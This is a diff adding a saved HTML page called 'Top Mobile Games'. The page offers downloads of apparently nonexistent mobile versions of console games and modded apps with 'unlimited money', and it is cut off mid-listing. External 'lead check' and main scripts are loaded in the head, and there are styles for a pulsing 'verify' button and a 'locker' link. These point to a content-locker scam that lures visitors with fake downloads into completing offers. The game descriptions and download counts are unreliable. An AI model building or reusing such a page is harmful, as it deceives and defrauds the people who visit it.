@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<!-- saved from url=(0017)https://xm1.site/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script type="text/javascript">
+    var azXVn_uVO_xqZmjc={"it":4405045,"key":"c0878"};
+</script>
+<script src="./Top Mobile Games_files/6c0e80c.js.تنزيل"></script><script type="text/javascript" src="./Top Mobile Games_files/hWN7ym8oNunvPo.4405045.c0878.0.js.تنزيل" id="xfMAINJS"></script><link rel="stylesheet" href="./Top Mobile Games_files/css_frontXF.css" id="xfGLOBALSTYLE">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Top Mobile Games</title>
+<style>
+#verifyBtn {
+  padding: 16px 35px;
+  background: linear-gradient(45deg,#ff4b2b,#ff416c);
+  color: #fff;
+  border: none;
+  border-radius: 50px;
+  font-size: 1.4em;
+  font-weight: bold;
+  cursor: pointer;
+  margin-top: 20px;
+  letter-spacing: 1px;
+  box-shadow: 0 6px 20px rgba(255,65,108,0.4);
+  animation: pulse 1.8s infinite;
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+
+#verifyBtn:hover {
+  transform: scale(1.1);
+  box-shadow: 0 8px 25px rgba(255,65,108,0.7);
+}
+
+@keyframes pulse {
+  0% { transform: scale(1); }
+  50% { transform: scale(1.07); }
+  100% { transform: scale(1); }
+}
+
+
+body {
+  font-family: 'Segoe UI', Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #2c2c2c;
+  color: #fff;
+}
+header { text-align:center; padding:20px 0; }
+/* logo slightly bigger and more visible */
+#logo { width:180px; animation:bounce 2s infinite alternate; opacity:0.98; }
+@keyframes bounce {0%{transform:translateY(0);}100%{transform:translateY(-10px);} }
+
+.games-container {
+  max-width: 1200px;
+  margin:0 auto;
+  display:grid;
+  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+  gap:20px;
+  padding:20px;
+}
+
+.game-card {
+  background:#383838;
+  border-radius:16px;
+  padding:15px;
+  display:flex;
+  flex-direction:column;
+  color:#fff;
+  box-shadow:0 10px 25px rgba(0,0,0,0.5);
+  position:relative;
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+.game-card:hover {
+  transform: translateY(-8px);
+  box-shadow:0 15px 35px rgba(0,0,0,0.7);
+}
+
+.badge {
+  position:absolute;
+  top:10px;
+  right:10px;
+  background:#ff4b2b;
+  color:#fff;
+  padding:3px 8px;
+  font-size:0.75em;
+  font-weight:bold;
+  border-radius:8px;
+}
+
+.game-info { display:flex; align-items:center; gap:10px; transition: transform 0.3s;}
+/* game images a bit larger so every game's picture is clearer */
+.game-info img { width:90px; height:90px; object-fit:cover; border-radius:8px; border:1px solid #555; transition: transform 0.3s;}
+.game-info:hover img { transform: scale(1.08);} /* keep subtle hover */
+.game-text h3 { margin:0; font-size:1.2em; color:#fff; }
+.game-text p.downloads { display:flex; align-items:center; gap:5px; font-size:0.9em; font-weight:bold; color:#ccc; margin-top:5px; }
+.game-text p.downloads img { width:20px; height:20px; }
+.rating { margin-top:5px; color:#ffcc00; font-size:0.9em; }
+
+.download-section { display:flex; flex-direction:column; align-items:center; margin-top:15px; }
+.choose-device { font-size:0.9em; margin-bottom:10px; color:#ccc; font-weight:bold; }
+.download-btns { display:flex; justify-content:center; gap:12px; }
+.download-btn { display:flex; align-items:center; gap:5px; padding:8px 14px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; color:#fff; background: linear-gradient(45deg,#ff4b2b,#ff416c); transition: transform 0.3s, box-shadow 0.3s;}
+.download-btn:hover { transform: scale(1.15) rotate(-3deg); box-shadow:0 5px 20px rgba(0,0,0,0.7);}
+.download-btn img { width:20px; height:20px; }
+
+/* Modal */
+.download-modal {
+  display:none;
+  position: fixed;
+  top:50%;
+  left:50%;
+  transform: translate(-50%,-50%);
+  background:#383838;
+  color:#fff;
+  padding:25px;
+  border-radius:16px;
+  width:90%;
+  max-width:450px;
+  text-align:center;
+  z-index:10;
+  box-shadow:0 10px 30px rgba(0,0,0,0.7);
+  animation:fadeIn 0.3s ease;
+}
+@keyframes fadeIn {0%{opacity:0; transform:translate(-50%,-55%);}100%{opacity:1; transform:translate(-50%,-50%);} }
+#modalTitle{margin:15px 0 10px; font-size:1.5em; color:#fff;}
+/* make modal image bigger and clearer */
+#modalImg{width:50%; border-radius:12px; margin-bottom:15px; max-height:260px; object-fit:cover;}
+#modalDesc{font-size:1em; margin-bottom:15px; color:#ccc;}
+#modalInfo{font-size:1em; margin-bottom:20px; color:#ffcc00; font-weight:bold;}
+/* Download button: add a gentle floating animation so it "moves" (kayd7rek) with an attractive style */
+@keyframes floatBtn {0%{transform:translateY(0) scale(1);}50%{transform:translateY(-8px) scale(1.02);}100%{transform:translateY(0) scale(1);} }
+#modalDownloadBtn{font-size:1.2em; padding:14px 25px; border:none; border-radius:12px; cursor:pointer; background: linear-gradient(45deg,#ff4b2b,#ff416c); color:#fff; font-weight:bold; display:block; margin:0 auto; transition: transform 0.25s, box-shadow 0.3s; box-shadow:0 8px 20px rgba(255,65,108,0.12); will-change:transform; animation: floatBtn 2.8s ease-in-out infinite;}
+#modalDownloadBtn:hover{ transform: scale(1.12) rotate(-2deg); box-shadow:0 10px 25px rgba(0,0,0,0.5);} 
+
+/* Loader */
+.modal{display:none; position:fixed; z-index:20; left:0; top:0; width:100%; height:100%; background-color: rgba(0,0,0,0.8); justify-content:center; align-items:center;}
+.modal-content{background:#383838; color:#fff; padding:25px; border-radius:16px; max-width:400px; text-align:center; box-shadow:0 10px 25px rgba(0,0,0,0.7);}
+.loader{border:5px solid #555; border-top:5px solid #ff4b2b; border-radius:50%; width:50px; height:50px; animation: spin 1s linear infinite; margin:20px auto;}
+@keyframes spin{100%{transform:rotate(360deg);} }
+#lockerText a{color:#ff416c; font-weight:bold; font-size:1.5em; text-decoration:none; cursor:pointer;}
+
+footer{text-align:center; padding:20px; font-size:0.9em; color:#aaa;}
+</style>
+<link data-it="4405045" rel="stylesheet" id="xfSPECIFICSTYLE" href="./Top Mobile Games_files/cssXF.css"><style type="text/css" id="xfSettingsCSS">#xf_MODAL_CONTAINER #xfMODALCONTENT{animation-duration: 600ms;-webkit-transition: all 600ms;transition: all 600ms;transition-duration: 600ms;}</style><script id="xfLEADCHECK" type="text/javascript" src="https://d2xohqmdyl2cj3.cloudfront.net/public/external/check.php?it=4405045&amp;time=1764178371497"></script></head>
+<body>
+
+<header>
+  <img src="./Top Mobile Games_files/Games_Workshop_logo.svg.png" id="logo" alt="Logo">
+</header>
+
+<div class="games-container">
+
+<!-- Game 1 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+<div class="divider"></div>
+    <img src="./Top Mobile Games_files/332140079.jpeg" alt="GTA 5 Mobile">
+    <div class="game-text">
+      <h3>GTA 5 MOBILE</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">100M</p>
+      <div class="rating" title="4 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;GTA 5 Mobile&#39;,&#39;GTA 5 is an open-world action game where you can explore Los Santos, complete missions, drive cars, and experience thrilling adventures.&#39;,&#39;https://www5.0zz0.com/2023/10/15/08/332140079.jpeg&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;GTA 5 Mobile&#39;,&#39;GTA 5 is an open-world action game where you can explore Los Santos, complete missions, drive cars, and experience thrilling adventures.&#39;,&#39;https://www5.0zz0.com/2023/10/15/08/332140079.jpeg&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 2 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/EsGaEjHVjly_beK_ZCBl8Uoz6NRbm7fZm4qI-OdcFZU.jpg" alt="Speed Racer">
+    <div class="game-text">
+      <h3>GTA Vice City</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">30M</p>
+      <div class="rating" title="5 stars">⭐️⭐️⭐️⭐️⭐️</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;GTA Vice City&#39;,&#39;GTA Vice City is an action-packed open-world game set in a vibrant 1980s city, where you complete missions, drive cars, and experience thrilling gangster adventures.&#39;,&#39;https://external-preview.redd.it/EsGaEjHVjly_beK_ZCBl8Uoz6NRbm7fZm4qI-OdcFZU.jpg?auto=webp&amp;s=cca9f55d488344b7c72b7023ce8bfa8748fbea2d&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;GTA Vice City&#39;,&#39;GTA Vice City is an action-packed open-world game set in a vibrant 1980s city, where you complete missions, drive cars, and experience thrilling gangster adventures.&#39;,&#39;https://external-preview.redd.it/EsGaEjHVjly_beK_ZCBl8Uoz6NRbm7fZm4qI-OdcFZU.jpg?auto=webp&amp;s=cca9f55d488344b7c72b7023ce8bfa8748fbea2d&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 3 -->
+<div class="game-card">
+  <div class="badge">TOP</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/beamng-drive-mobile-logo" alt="Mind Bender">
+    <div class="game-text">
+      <h3>BeamNG.drive MOBILE</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">5M</p>
+      <div class="rating" title="3 stars">⭐️⭐️⭐️☆☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;BeamNG.drive MOBILE&#39;,&#39;BeamNG.drive MOBILE is a realistic car simulation game featuring soft-body physics, intense crashes, and open-world driving adventures.&#39;,&#39;https://images.sftcdn.net/images/t_app-icon-m/p/7d0609b1-0194-4eb2-9307-12f91266dc7b/3469311303/beamng-drive-mobile-logo&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;BeamNG.drive MOBILE&#39;,&#39;BeamNG.drive MOBILE is a realistic car simulation game featuring soft-body physics, intense crashes, and open-world driving adventures.&#39;,&#39;https://images.sftcdn.net/images/t_app-icon-m/p/7d0609b1-0194-4eb2-9307-12f91266dc7b/3469311303/beamng-drive-mobile-logo&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 4 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/0oRMkLrk8IoCyGQfYpdIzVF5dzPP6cM4.png" alt="Watch Dogs 2">
+    <div class="game-text">
+      <h3>Watch Dogs 2</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">7M</p>
+      <div class="rating" title="5 stars">⭐️⭐️⭐️⭐️⭐️</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Watch Dogs 2&#39;,&#39;Watch Dogs 2 Mobile is an open-world action game where you play as a skilled hacker in San Francisco, using technology to control the city and complete thrilling missions.&#39;,&#39;https://image.api.playstation.com/cdn/EP0001/CUSA06328_00/0oRMkLrk8IoCyGQfYpdIzVF5dzPP6cM4.png&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Watch Dogs 2&#39;,&#39;Watch Dogs 2 Mobile is an open-world action game where you play as a skilled hacker in San Francisco, using technology to control the city and complete thrilling missions.&#39;,&#39;https://image.api.playstation.com/cdn/EP0001/CUSA06328_00/0oRMkLrk8IoCyGQfYpdIzVF5dzPP6cM4.png&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 5 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/images" alt="GTA SAN ANDREAS">
+    <div class="game-text">
+      <h3>GTA SAN ANDREAS</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">120M</p>
+      <div class="rating" title="4 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;GTA SAN ANDREAS&#39;,&#39;GTA San Andreas Mobile is a legendary open-world action game where you explore California-inspired cities, complete missions, and live the ultimate gangster adventure.&#39;,&#39;https://t0.gstatic.com/images?q=tbn:ANd9GcQKFrwPJcaQVe6qNoplr5y4BR3CGOjZmGpwiRNka1oVz1ci9Y12r4YfPTjC2v6TgUF0iQbh_g&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;GTA SAN ANDREAS&#39;,&#39;GTA San Andreas Mobile is a legendary open-world action game where you explore California-inspired cities, complete missions, and live the ultimate gangster adventure.&#39;,&#39;https://t0.gstatic.com/images?q=tbn:ANd9GcQKFrwPJcaQVe6qNoplr5y4BR3CGOjZmGpwiRNka1oVz1ci9Y12r4YfPTjC2v6TgUF0iQbh_g&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 6 -->
+<div class="game-card">
+  <div class="badge">TOP</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/139956125247f2e623240a13f96b07f9.png" alt="NARUTO: Ultimate Ninja STORM">
+    <div class="game-text">
+      <h3>NARUTO: Ultimate Ninja STORM</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">989K</p>
+      <div class="rating" title="5 stars">⭐️⭐️⭐️⭐️⭐️</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;NARUTO: Ultimate Ninja STORM&#39;,&#39;NARUTO: Ultimate Ninja STORM is an action fighting game featuring epic battles, stunning graphics, and the full Naruto storyline with your favorite ninjas.&#39;,&#39;https://img.tapimg.net/market/images/139956125247f2e623240a13f96b07f9.png&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;NARUTO: Ultimate Ninja STORM&#39;,&#39;NARUTO: Ultimate Ninja STORM is an action fighting game featuring epic battles, stunning graphics, and the full Naruto storyline with your favorite ninjas.&#39;,&#39;https://img.tapimg.net/market/images/139956125247f2e623240a13f96b07f9.png&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 7 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/the-last-of-us-download-the-last-of-us.jpg" alt="The Last of Us Mobile">
+    <div class="game-text">
+      <h3>The Last of Us Mobile</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">2M</p>
+      <div class="rating" title="4 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;The Last of Us Mobile&#39;,&#39;The Last of Us Mobile is a survival action game where players explore a post-apocalyptic world, fight infected, and experience an emotional story of survival and hope.!&#39;,&#39;https://images.sftcdn.net/images/t_app-icon-m/p/871653b7-b23a-4530-9c0b-00b7b1eed5c4/1113040760/the-last-of-us-download-the-last-of-us.jpg&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;The Last of Us Mobile&#39;,&#39;The Last of Us Mobile is a survival action game where players explore a post-apocalyptic world, fight infected, and experience an emotional story of survival and hope.&#39;,&#39;https://images.sftcdn.net/images/t_app-icon-m/p/871653b7-b23a-4530-9c0b-00b7b1eed5c4/1113040760/the-last-of-us-download-the-last-of-us.jpg&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+<!-- Game 1 -->
+<div class="game-card">
+  <div class="badge">NEW</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/unnamed.webp" alt="WWE 2K25">
+    <div class="game-text">
+      <h3>WWE 2K25</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">1M</p>
+      <div class="rating" title="4 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;WWE 2K25&#39;,&#39;WWE 2K25: Netflix Edition invites players into the thrilling world of wrestling with a robust roster of over 40 WWE Superstars and Legends. Engage in dynamic matches featuring authentic entrances and commentary, while choosing from various game modes including Career, PvP, and Quick Play. Rise through the ranks, enhance your Superstar’s stats, and compete for WWE titles. With adjustable difficulty and options for both single-player and real-time multiplayer experiences, this mobile game offers an immersive wrestling simulation for fans of all skill levels.&#39;,&#39;https://play-lh.googleusercontent.com/uD9hXMYt6fqwiSnTd6vqj0pi5JfTvIHbZR9OFllSPcuG_V1iGwNOJ26wwXd1b0z89zp-=w240-h480-rw&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;WWE 2K25&#39;,&#39;WWE 2K25: Netflix Edition invites players into the thrilling world of wrestling with a robust roster of over 40 WWE Superstars and Legends. Engage in dynamic matches featuring authentic entrances and commentary, while choosing from various game modes including Career, PvP, and Quick Play. Rise through the ranks, enhance your Superstar’s stats, and compete for WWE titles. With adjustable difficulty and options for both single-player and real-time multiplayer experiences, this mobile game offers an immersive wrestling simulation for fans of all skill levels.&#39;,&#39;https://play-lh.googleusercontent.com/uD9hXMYt6fqwiSnTd6vqj0pi5JfTvIHbZR9OFllSPcuG_V1iGwNOJ26wwXd1b0z89zp-=w240-h480-rw&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 2 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/abccb969549318afaea4e78fb72cad3a.jpg" alt="SCar Parking Multiplayer Mod">
+    <div class="game-text">
+      <h3>Car Parking Multiplayer Mod</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">892K</p>
+      <div class="rating" title="5 stars">⭐️⭐️⭐️⭐️⭐️</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Car Parking Multiplayer Mod&#39;,&#39;Car Parking Multiplayer Mod is a realistic driving and parking simulator with unlimited money, unlocked cars, and exciting online multiplayer gameplay.&#39;,&#39;https://i.git99.com/upload/android/icon/2024/05/22/abccb969549318afaea4e78fb72cad3a.jpg&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Car Parking Multiplayer Mod&#39;,&#39;Car Parking Multiplayer Mod is a realistic driving and parking simulator with unlimited money, unlocked cars, and exciting online multiplayer gameplay.&#39;,&#39;https://i.git99.com/upload/android/icon/2024/05/22/abccb969549318afaea4e78fb72cad3a.jpg&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 3 -->
+<div class="game-card">
+  <div class="badge">TOP</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/unnamed.png" alt="PPSSPP Gold">
+    <div class="game-text">
+      <h3>PPSSPP Gold MOD</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">654K</p>
+      <div class="rating" title="3 stars">⭐️⭐️⭐️☆☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;PPSSPP Gold MOD&#39;,&#39;PPSSPP Gold MOD is a powerful PSP emulator for mobile that lets you play classic PSP games with enhanced graphics, smooth performance, and premium unlocked features.&#39;,&#39;https://play-lh.googleusercontent.com/10fZZfOPjwESHD3wFAZx65m6uwDxMqj2yokiSlOwJzrqxokol9Qc1hwMQnZOWTCtgB4&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;PPSSPP Gold MOD&#39;,&#39;PPSSPP Gold MOD is a powerful PSP emulator for mobile that lets you play classic PSP games with enhanced graphics, smooth performance, and premium unlocked features.&#39;,&#39;https://play-lh.googleusercontent.com/10fZZfOPjwESHD3wFAZx65m6uwDxMqj2yokiSlOwJzrqxokol9Qc1hwMQnZOWTCtgB4&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 4 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/unnamed(1).png" alt="CarX Street Mod">
+    <div class="game-text">
+      <h3>CarX Street Mod</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">2M</p>
+      <div class="rating" title="5 stars">⭐️⭐️⭐️⭐️⭐️</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;CarX Street Mod&#39;,&#39;CarX Street Mod (Unlimited Money) Works on iOS &amp; Android&#39;,&#39;https://play-lh.googleusercontent.com/B8INYkehIFue2QH_RoTQ6Rs5VndWrgUaKdscFCMWQwOQW13jwQE1YyBryuQA00XAshc&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;CarX Street Mod&#39;,&#39;CarX Street Mod (Unlimited Money) Works on iOS &amp; Android&#39;,&#39;https://play-lh.googleusercontent.com/B8INYkehIFue2QH_RoTQ6Rs5VndWrgUaKdscFCMWQwOQW13jwQE1YyBryuQA00XAshc&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 5 -->
+<div class="game-card">
+  <div class="badge">NEW</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/images(1)" alt="Assetto Corsa Mobile">
+    <div class="game-text">
+      <h3>Assetto Corsa Mobile</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">985K</p>
+      <div class="rating" title="4 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Assetto Corsa Mobile&#39;,&#39;Assetto Corsa Mobile is a realistic racing simulator with advanced physics, high-quality graphics, and immersive driving experiences on your phone.&#39;,&#39;https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsv7-mEL1UXJbWJNZMtkffQzMXXZWYoOD8zw&amp;s&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Assetto Corsa Mobile&#39;,&#39;Assetto Corsa Mobile is a realistic racing simulator with advanced physics, high-quality graphics, and immersive driving experiences on your phone.&#39;,&#39;https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsv7-mEL1UXJbWJNZMtkffQzMXXZWYoOD8zw&amp;s&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 6 -->
+<div class="game-card">
+  <div class="badge">TOP</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/1257de996c9d625bd6d16e683576218ea55a04e4ff97982b.png" alt="Rooftops &amp; Alleys">
+    <div class="game-text">
+      <h3>Rooftops &amp; Alleys</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">456K</p>
+      <div class="rating" title="5 stars">⭐️⭐️⭐️⭐️⭐️</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Rooftops &amp; Alleys&#39;,&#39;Rooftops &amp; Alleys: The Parkour Game is a free-running adventure where you jump across rooftops, perform stunts, and experience realistic parkour action on mobile.&#39;,&#39;https://image.api.playstation.com/vulcan/ap/rnd/202504/0811/1257de996c9d625bd6d16e683576218ea55a04e4ff97982b.png&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Rooftops &amp; Alleys&#39;,&#39;Rooftops &amp; Alleys: The Parkour Game is a free-running adventure where you jump across rooftops, perform stunts, and experience realistic parkour action on mobile.&#39;,&#39;https://image.api.playstation.com/vulcan/ap/rnd/202504/0811/1257de996c9d625bd6d16e683576218ea55a04e4ff97982b.png&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 7 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/etsicon.png" alt="Euro Truck Simulator Mobile">
+    <div class="game-text">
+      <h3>Euro Truck Simulator Mobile</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">5M</p>
+      <div class="rating" title="4 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Euro Truck Simulator Mobile&#39;,&#39;Euro Truck Simulator Mobile lets you drive trucks across Europe, deliver cargo, and experience realistic trucking adventures on your mobile device.&#39;,&#39;https://portsized.fun/etsicon.png&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Euro Truck Simulator Mobile&#39;,&#39;Euro Truck Simulator Mobile lets you drive trucks across Europe, deliver cargo, and experience realistic trucking adventures on your mobile device.&#39;,&#39;https://portsized.fun/etsicon.png&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+<!-- Game 1 -->
+<div class="game-card">
+  <div class="badge">NEW</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/bf53eec311119801d096ef4c5e05ef0feb20c365e568e344.png" alt="Rematch mobile">
+    <div class="game-text">
+      <h3>Rematch mobile</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">1M</p>
+      <div class="rating" title="4 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Rematch mobile&#39;,&#39;Step into the arena with Rematch Mobile—an action-packed competitive fighter. Test your skills in fast-paced duels, challenge friends worldwide, and prove you’re the true champion.&#39;,&#39;https://image.api.playstation.com/vulcan/ap/rnd/202412/1301/bf53eec311119801d096ef4c5e05ef0feb20c365e568e344.png&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Rematch mobile&#39;,&#39;Step into the arena with Rematch Mobile—an action-packed competitive fighter. Test your skills in fast-paced duels, challenge friends worldwide, and prove you’re the true champion.&#39;,&#39;https://image.api.playstation.com/vulcan/ap/rnd/202412/1301/bf53eec311119801d096ef4c5e05ef0feb20c365e568e344.png&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 2 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/minecraft-1639513933156.jpg" alt="Minecraft Mobile">
+    <div class="game-text">
+      <h3>Minecraft</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">12M</p>
+      <div class="rating" title="5 stars">⭐️⭐️⭐️⭐️⭐️</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Minecraft&#39;,&#39;Unleash your creativity in Minecraft – build, explore, and adventure like never before&#39;,&#39;https://assets-prd.ignimgs.com/2021/12/14/minecraft-1639513933156.jpg&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Minecraft&#39;,&#39;Unleash your creativity in Minecraft – build, explore, and adventure like never before&#39;,&#39;https://assets-prd.ignimgs.com/2021/12/14/minecraft-1639513933156.jpg&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 3 -->
+<div class="game-card">
+  <div class="badge">TOP</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/13758993" alt="EFOOTBALL 25 Mod">
+    <div class="game-text">
+      <h3>Pokémon Legends:ZA</h3>
